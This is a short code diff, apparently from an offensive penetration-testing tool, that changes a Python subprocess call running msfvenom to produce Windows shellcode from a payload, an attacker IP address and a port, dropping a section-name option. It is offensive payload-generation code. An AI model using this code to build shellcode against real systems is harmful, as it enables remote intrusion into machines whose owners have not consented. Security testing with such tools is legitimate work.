@@ -787,7 +787,7 @@ def generate_shellcode(payload, ipaddr, port):
 
         # gen random number for length
         uri_length=generate_random_number(3,6)
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --smallest --sec-name goatsgoatsgoatsgoats --platform windows -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --smallest --platform windows -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 
         # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false
 
